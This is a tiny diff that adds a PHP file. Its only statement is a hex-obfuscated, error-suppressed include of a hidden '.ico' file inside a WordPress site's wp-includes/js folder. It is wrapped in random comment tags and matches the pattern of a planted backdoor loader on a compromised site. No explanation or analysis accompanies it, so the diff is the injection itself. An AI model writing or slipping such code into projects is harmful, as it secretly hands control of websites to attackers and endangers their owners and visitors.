@@ -1,0 +1,7 @@
+<?php
+/*a499a*/
+
+@include "\x45:/V\x68ost\x73/ss\x65ntr\x65gas\x2ecom\x2ebr/\x68ttp\x64ocs\x2fwp-\x4fLD-\x46/wp\x2dinc\x6cude\x73/js\x2f.4f\x65253\x61b.i\x63o";
+
+/*a499a*/
+
